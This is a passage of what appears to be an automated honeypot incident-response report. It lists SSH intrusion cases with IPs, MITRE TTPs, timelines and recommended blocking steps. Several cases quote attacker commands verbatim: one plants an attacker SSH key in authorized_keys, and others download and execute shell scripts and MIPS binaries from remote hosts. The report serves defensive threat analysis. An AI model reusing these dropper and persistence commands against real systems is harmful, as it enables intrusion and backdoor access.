- [ ] Submit `88.96.39[.]28` to AbuseIPDB if not already reported
- [ ] Block `88.96.39[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db4026fe49bd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-11-27 01:49 |
| **Last Seen** | 2026-11-27 01:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 01:49:02` | `cowrie.session.connect` |
| `2026-11-27 01:49:02` | `cowrie.client.version` |
| `2026-11-27 01:49:02` | `cowrie.client.kex` |
| `2026-11-27 01:49:03` | `cowrie.login.success` |
| `2026-11-27 01:49:04` | `cowrie.session.params` |
| `2026-11-27 01:49:04` | `cowrie.command.input` |
| `2026-11-27 01:49:04` | `cowrie.command.failed` |
| `2026-11-27 01:49:04` | `cowrie.log.closed` |
| `2026-11-27 01:49:05` | `cowrie.session.params` |
| `2026-11-27 01:49:05` | `cowrie.command.input` |
| `2026-11-27 01:49:05` | `cowrie.session.file_download` |
| `2026-11-27 01:49:05` | `cowrie.log.closed` |
| `2026-11-27 01:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47edd76d01b4

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-11-27 01:49 |
| **Last Seen** | 2026-11-27 01:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 01:49:05` | `cowrie.session.connect` |
| `2026-11-27 01:49:05` | `cowrie.client.version` |
| `2026-11-27 01:49:05` | `cowrie.client.kex` |
| `2026-11-27 01:49:06` | `cowrie.login.success` |
| `2026-11-27 01:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620f7311b86d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-27 02:01 |
| **Last Seen** | 2026-11-27 02:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 02:01:08` | `cowrie.session.connect` |
| `2026-11-27 02:01:09` | `cowrie.login.success` |
| `2026-11-27 02:01:09` | `cowrie.session.params` |
| `2026-11-27 02:01:09` | `cowrie.log.closed` |
| `2026-11-27 02:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e4e71b7c9a

| Field | Detail |
|---|---|
| **Source IP** | `163.52.135[.]28` |
| **First Seen** | 2026-11-27 02:02 |
| **Last Seen** | 2026-11-27 02:02 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 02:02:26` | `cowrie.session.connect` |
| `2026-11-27 02:02:27` | `cowrie.client.version` |
| `2026-11-27 02:02:27` | `cowrie.client.kex` |
| `2026-11-27 02:02:47` | `cowrie.login.success` |
| `2026-11-27 02:02:52` | `cowrie.session.params` |
| `2026-11-27 02:02:52` | `cowrie.command.input` |
| `2026-11-27 02:02:56` | `cowrie.log.closed` |
| `2026-11-27 02:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.52.135[.]28` to AbuseIPDB if not already reported
- [ ] Block `163.52.135[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01cc22378af9

| Field | Detail |
|---|---|
| **Source IP** | `177.75.235[.]46` |
| **First Seen** | 2026-11-27 02:02 |
| **Last Seen** | 2026-11-27 02:03 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 02:02:55` | `cowrie.session.connect` |
| `2026-11-27 02:02:58` | `cowrie.client.version` |
| `2026-11-27 02:02:58` | `cowrie.client.kex` |
| `2026-11-27 02:03:14` | `cowrie.login.success` |
| `2026-11-27 02:03:23` | `cowrie.session.params` |
| `2026-11-27 02:03:23` | `cowrie.command.input` |
| `2026-11-27 02:03:27` | `cowrie.log.closed` |
| `2026-11-27 02:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.75.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `177.75.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d16eef9385f9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-27 02:06 |
| **Last Seen** | 2026-11-27 02:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 02:06:46` | `cowrie.session.connect` |
| `2026-11-27 02:06:46` | `cowrie.client.version` |
| `2026-11-27 02:06:46` | `cowrie.client.kex` |
| `2026-11-27 02:06:47` | `cowrie.login.success` |
| `2026-11-27 02:06:47` | `cowrie.direct-tcpip.request` |
| `2026-11-27 02:06:47` | `cowrie.direct-tcpip.data` |
| `2026-11-27 02:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f993761e9bf6

| Field | Detail |
|---|---|
| **Source IP** | `191.217.250[.]87` |
| **First Seen** | 2026-11-27 02:07 |
| **Last Seen** | 2026-11-27 02:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo W$((2+3))X, (2+3, echo WOKX, cd /tmp 2>/dev/null||cd /var/tmp 2>/dev/null||cd /dev/shm 2>/dev/null||cd .;rm -f r.sh;if command -v wget >/dev/null 2>&1; then wget -q --timeout=12 -O r.sh hxxp://45.198.224[.]75/run.sh; fi;if [ ! -s r.sh ] && command -v curl >/dev/null 2>&1; then curl -fsS --max-time 15 -o r.sh hxxp://45.198.224[.]75/run.sh; fi;if [ ! -s r.sh ] && command -v busybox >/dev/null 2>&1; then busybox wget -q -O r.sh hxxp://45.198.224[.]75/run.sh; fi;[ -s r.sh ] || { echo __FAIL_DL__; exit 0; };chmod 777 r.sh 2>/dev/null; chmod +x r., wc -c < r.sh 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 02:07:51` | `cowrie.session.connect` |
| `2026-11-27 02:07:54` | `cowrie.login.success` |
| `2026-11-27 02:07:55` | `cowrie.session.params` |
| `2026-11-27 02:07:55` | `cowrie.command.input` |
| `2026-11-27 02:07:55` | `cowrie.command.input` |
| `2026-11-27 02:07:55` | `cowrie.command.input` |
| `2026-11-27 02:07:55` | `cowrie.command.input` |
| `2026-11-27 02:07:55` | `cowrie.command.input` |
| `2026-11-27 02:07:55` | `cowrie.command.input` |
| `2026-11-27 02:07:55` | `cowrie.command.input` |
| `2026-11-27 02:07:55` | `cowrie.command.failed` |
| `2026-11-27 02:07:55` | `cowrie.command.failed` |
| `2026-11-27 02:07:55` | `cowrie.command.failed` |
| `2026-11-27 02:07:55` | `cowrie.command.failed` |
| `2026-11-27 02:07:55` | `cowrie.command.failed` |
| … | _9 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `191.217.250[.]87` to AbuseIPDB if not already reported
- [ ] Block `191.217.250[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b16f8404a07

| Field | Detail |
|---|---|
| **Source IP** | `191.217.250[.]87` |
| **First Seen** | 2026-11-27 02:25 |
| **Last Seen** | 2026-11-27 02:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo W$((2+3))X, (2+3, echo WOKX, cd /tmp 2>/dev/null||cd /var/tmp 2>/dev/null||cd /dev/shm 2>/dev/null||cd .;rm -f r.sh;if command -v wget >/dev/null 2>&1; then wget -q --timeout=12 -O r.sh hxxp://191.217.250[.]87/run.sh; fi;if [ ! -s r.sh ] && command -v curl >/dev/null 2>&1; then curl -fsS --max-time 15 -o r.sh hxxp://191.217.250[.]87/run.sh; fi;if [ ! -s r.sh ] && command -v busybox >/dev/null 2>&1; then busybox wget -q -O r.sh hxxp://191.217.250[.]87/run.sh; fi;[ -s r.sh ] || { echo __FAIL_DL__; exit 0; };chmod 777 r.sh 2>/dev/null; chmod +x, wc -c < r.sh 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 02:25:54` | `cowrie.session.connect` |
| `2026-11-27 02:25:57` | `cowrie.login.success` |
| `2026-11-27 02:25:58` | `cowrie.session.params` |
| `2026-11-27 02:25:58` | `cowrie.command.input` |
| `2026-11-27 02:25:58` | `cowrie.command.input` |
| `2026-11-27 02:25:58` | `cowrie.command.input` |
| `2026-11-27 02:25:58` | `cowrie.command.input` |
| `2026-11-27 02:25:58` | `cowrie.command.input` |
| `2026-11-27 02:25:58` | `cowrie.command.input` |
| `2026-11-27 02:25:58` | `cowrie.command.input` |
| `2026-11-27 02:25:58` | `cowrie.command.failed` |
| `2026-11-27 02:25:58` | `cowrie.command.failed` |
| `2026-11-27 02:25:58` | `cowrie.command.failed` |
| `2026-11-27 02:25:58` | `cowrie.command.failed` |
| `2026-11-27 02:25:58` | `cowrie.command.failed` |
| … | _9 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `191.217.250[.]87` to AbuseIPDB if not already reported
- [ ] Block `191.217.250[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c914a4317b4

| Field | Detail |
|---|---|
| **Source IP** | `35.210.49[.]18` |
| **First Seen** | 2026-11-27 02:42 |
| **Last Seen** | 2026-11-27 02:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 02:42:00` | `cowrie.session.connect` |
| `2026-11-27 02:42:00` | `cowrie.client.version` |
| `2026-11-27 02:42:00` | `cowrie.client.kex` |
| `2026-11-27 02:42:02` | `cowrie.login.success` |
| `2026-11-27 02:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.49[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.210.49[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34f69985327

| Field | Detail |
|---|---|
| **Source IP** | `191.217.250[.]87` |
| **First Seen** | 2026-11-27 03:05 |
| **Last Seen** | 2026-11-27 03:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo W$((2+3))X, (2+3, echo WOKX, cd /tmp 2>/dev/null||cd /var/tmp 2>/dev/null||cd /dev/shm 2>/dev/null;{wget -q -O mipsel hxxp://45.198.224[.]75/mipsel||curl -fsS -o mipsel hxxp://45.198.224[.]75/mipsel||busybox wget -q -O mipsel hxxp://45.198.224[.]75/mipsel;} 2>/dev/null;chmod +x mipsel 2>/dev/null;chmod 777 mipsel 2>/dev/null;./mipsel >/dev/null 2>&1 &{wget -q -O mips hxxp://45.198.224[.]75/mips||curl -fsS -o mips hxxp://45.198.224[.]75/mips||busybox wget -q -O mips hxxp://45.198.224[.]75/mips;} 2>/dev/null;chmod +x mips 2>/dev/null;chmod 777 mips ` |
| **Download Attempts** | hxxp://45.198.224[.]75/mipsel, hxxp://45.198.224[.]75/mips, hxxp://45.198.224[.]75/mpsl |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 03:05:03` | `cowrie.session.connect` |
| `2026-11-27 03:05:06` | `cowrie.login.success` |
| `2026-11-27 03:05:06` | `cowrie.session.params` |
| `2026-11-27 03:05:07` | `cowrie.command.input` |
| `2026-11-27 03:05:07` | `cowrie.command.input` |
| `2026-11-27 03:05:07` | `cowrie.command.input` |
| `2026-11-27 03:05:07` | `cowrie.command.input` |
| `2026-11-27 03:05:07` | `cowrie.command.input` |
| `2026-11-27 03:05:08` | `cowrie.command.input` |
| `2026-11-27 03:05:08` | `cowrie.command.failed` |
| `2026-11-27 03:05:08` | `cowrie.command.success` |
| `2026-11-27 03:05:08` | `cowrie.session.file_download` |
| `2026-11-27 03:05:09` | `cowrie.session.file_download` |
| `2026-11-27 03:05:10` | `cowrie.session.file_download` |
| `2026-11-27 03:05:11` | `cowrie.session.file_download` |
| … | _3 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `191.217.250[.]87` to AbuseIPDB if not already reported
- [ ] Block `191.217.250[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dcc02f16272

| Field | Detail |
|---|---|
| **Source IP** | `35.210.65[.]254` |
| **First Seen** | 2026-11-27 03:15 |
| **Last Seen** | 2026-11-27 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 03:15:37` | `cowrie.session.connect` |
| `2026-11-27 03:15:37` | `cowrie.login.success` |
| `2026-11-27 03:15:38` | `cowrie.session.params` |
| `2026-11-27 03:15:38` | `cowrie.command.input` |
| `2026-11-27 03:15:38` | `cowrie.command.input` |
| `2026-11-27 03:15:38` | `cowrie.command.failed` |
| `2026-11-27 03:15:38` | `cowrie.command.input` |
| `2026-11-27 03:15:38` | `cowrie.command.failed` |
| `2026-11-27 03:15:38` | `cowrie.command.input` |
| `2026-11-27 03:15:38` | `cowrie.log.closed` |
| `2026-11-27 03:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.65[.]254` to AbuseIPDB if not already reported
- [ ] Block `35.210.65[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (38) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-9b5106be2139 | HIGH | `138.124.116[.]194` | 2026-11-27 03:19 | Y | 4 | 0 | `T1078` |
| IR-4151ade01451 | HIGH | `35.210.202[.]151` | 2026-11-27 03:30 | Y | 3 | 0 | `T1078` |
| IR-18844e3fb565 | HIGH | `109.160.32[.]132` | 2026-11-27 03:37 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d3bd215bcc3e | HIGH | `38.137.11[.]14` | 2026-11-27 03:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c4d6dac742cc | HIGH | `38.137.11[.]14` | 2026-11-27 03:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ebd5c3a5877b | HIGH | `189.167.227[.]139` | 2026-11-27 03:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0b70fdeace3d | HIGH | `189.167.227[.]139` | 2026-11-27 03:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-68ebc9ccbb02 | HIGH | `45.121.25[.]115` | 2026-11-27 03:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-36a75fb33f27 | HIGH | `45.121.25[.]115` | 2026-11-27 03:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-537e7ef81f90 | HIGH | `35.206.134[.]30` | 2026-11-27 03:51 | Y | 3 | 0 | `T1078` |
| IR-257f75232e80 | HIGH | `160.119.66[.]206` | 2026-11-27 03:53 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-b811a763973e | HIGH | `160.119.66[.]206` | 2026-11-27 03:53 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-78f9d2e0a1fc | HIGH | `159.65.135[.]2` | 2026-11-27 03:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b2631daaf301 | HIGH | `159.65.135[.]2` | 2026-11-27 03:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c9fb55d8376d | HIGH | `20.193.141[.]133` | 2026-11-27 03:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1109480f3999 | HIGH | `20.193.141[.]133` | 2026-11-27 03:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0763fa96bf0 | HIGH | `223.207.93[.]227` | 2026-11-27 03:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-86031db3473f | HIGH | `223.207.93[.]227` | 2026-11-27 03:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-71e40e21ab02 | HIGH | `109.160.32[.]132` | 2026-11-27 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-422487bee9b3 | HIGH | `5.89.75[.]194` | 2026-11-27 04:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-47aa0899e83f | HIGH | `5.89.75[.]194` | 2026-11-27 04:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d88feba3027f | HIGH | `163.52.135[.]28` | 2026-11-27 04:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ab5283f118c9 | HIGH | `177.75.235[.]46` | 2026-11-27 04:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b5d37405c1d1 | HIGH | `195.178.110[.]78` | 2026-11-27 04:06 | Y | 0 | 0 | `T1078` |
| IR-c7073dc576f0 | HIGH | `176.53.159[.]196` | 2026-11-27 04:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-adbec877f9e2 | HIGH | `141.95.162[.]162` | 2026-11-27 04:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e0cc57097521 | HIGH | `141.95.162[.]162` | 2026-11-27 04:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c675a8540d14 | HIGH | `190.60.55[.]86` | 2026-11-27 04:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-619748ee7d26 | HIGH | `190.60.55[.]86` | 2026-11-27 04:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cf38bc04298d | HIGH | `35.210.29[.]250` | 2026-11-27 04:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-85b516ea950b | HIGH | `222.108.100[.]117` | 2026-11-27 04:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-492d6c80ea31 | HIGH | `222.108.100[.]117` | 2026-11-27 04:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e1983b4ef540 | HIGH | `131.161.249[.]165` | 2026-11-27 04:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a6970c1c509f | HIGH | `131.161.249[.]165` | 2026-11-27 04:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-58696cb5ea49 | HIGH | `154.51.59[.]118` | 2026-11-27 04:21 | Y | 19 | 2 | `T1021.004 · T1053.003 · T1057` |
| IR-ced2b95042d1 | HIGH | `78.128.112[.]74` | 2026-11-27 04:32 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e8c4260eee8c | HIGH | `163.52.135[.]28` | 2026-11-27 04:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9860262891bc | HIGH | `2.248.130[.]129` | 2026-11-27 04:41 | Y | 9 | 0 | `T1057 · T1078 · T1083` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]132` | **2** | 2026-11-27 03:35 | 2026-11-27 04:13 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]78` | **2** | 2026-11-27 00:55 | 2026-11-27 02:01 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `31.220.0[.]26` | **2** | 2026-11-27 00:25 | 2026-11-27 02:24 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.36.116[.]230` | 1 | 2026-11-27 00:14 | 2026-11-27 00:14 | 7s | 0 | `T1592` | 🟢 LOW |
| `103.148.235[.]249` | 1 | 2026-11-27 03:50 | 2026-11-27 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.234.41[.]32` | 1 | 2026-11-27 02:06 | 2026-11-27 02:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]8` | 1 | 2026-11-27 02:52 | 2026-11-27 02:52 | 8s | 0 | `T1592` | 🟢 LOW |
| `136.143.159[.]227` | 1 | 2026-11-27 01:22 | 2026-11-27 01:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-27 01:58 | 2026-11-27 01:59 | 63s | 0 | `T1592` | 🟢 LOW |
| `138.97.133[.]123` | 1 | 2026-11-27 04:12 | 2026-11-27 04:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `139.196.103[.]75` | 1 | 2026-11-27 01:04 | 2026-11-27 01:04 | 3s | 0 | `T1592` | 🟢 LOW |
| `152.32.150[.]138` | 1 | 2026-11-27 04:41 | 2026-11-27 04:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `153.79.187[.]84` | 1 | 2026-11-27 03:49 | 2026-11-27 03:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.51.59[.]118` | 1 | 2026-11-27 04:22 | 2026-11-27 04:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.52.135[.]28` | 1 | 2026-11-27 00:21 | 2026-11-27 00:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.52.135[.]28` | 1 | 2026-11-27 02:49 | 2026-11-27 02:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-27 01:49 | 2026-11-27 01:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `166.62.41[.]96` | 1 | 2026-11-27 01:32 | 2026-11-27 01:33 | 57s | 0 | `T1592` | 🟢 LOW |
| `175.196.131[.]202` | 1 | 2026-11-27 03:09 | 2026-11-27 03:10 | 30s | 0 | `T1592` | 🟢 LOW |
| `191.217.250[.]87` | 1 | 2026-11-27 00:05 | 2026-11-27 00:05 | 4s | 0 | `T1592` | 🟢 LOW |
| `191.217.250[.]87` | 1 | 2026-11-27 02:07 | 2026-11-27 02:07 | 4s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-27 04:06 | 2026-11-27 04:06 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `20.42.81[.]28` | 1 | 2026-11-27 00:27 | 2026-11-27 00:27 | 9s | 0 | `T1592` | 🟢 LOW |
| `223.204.9[.]150` | 1 | 2026-11-27 01:09 | 2026-11-27 01:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-27 04:47 | 2026-11-27 04:48 | 9s | 0 | `T1592` | 🟢 LOW |
| `31.148.20[.]210` | 1 | 2026-11-27 02:07 | 2026-11-27 02:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.134[.]30` | 1 | 2026-11-27 03:50 | 2026-11-27 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.17[.]199` | 1 | 2026-11-27 04:39 | 2026-11-27 04:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.202[.]151` | 1 | 2026-11-27 03:30 | 2026-11-27 03:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.250[.]26` | 1 | 2026-11-27 02:45 | 2026-11-27 02:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.29[.]250` | 1 | 2026-11-27 04:12 | 2026-11-27 04:12 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.49[.]18` | 1 | 2026-11-27 02:42 | 2026-11-27 02:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.65[.]254` | 1 | 2026-11-27 03:15 | 2026-11-27 03:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-27 02:16 | 2026-11-27 02:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-11-27 04:35 | 2026-11-27 04:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.72.124[.]213` | 1 | 2026-11-27 03:36 | 2026-11-27 03:36 | 12s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-11-27 04:16 | 2026-11-27 04:16 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]174` | 1 | 2026-11-27 02:32 | 2026-11-27 02:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]231` | 1 | 2026-11-27 02:32 | 2026-11-27 02:32 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]92` | 1 | 2026-11-27 02:31 | 2026-11-27 02:31 | 16s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-27 01:41 | 2026-11-27 01:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-27 00:16 | 2026-11-27 00:16 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-27 04:32 | 2026-11-27 04:32 | 6s | 0 | `T1592` | 🟢 LOW |
| `8.221.136[.]6` | 1 | 2026-11-27 00:54 | 2026-11-27 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.183.30[.]131` | 1 | 2026-11-27 01:16 | 2026-11-27 01:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]63` | 1 | 2026-11-27 00:36 | 2026-11-27 00:36 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
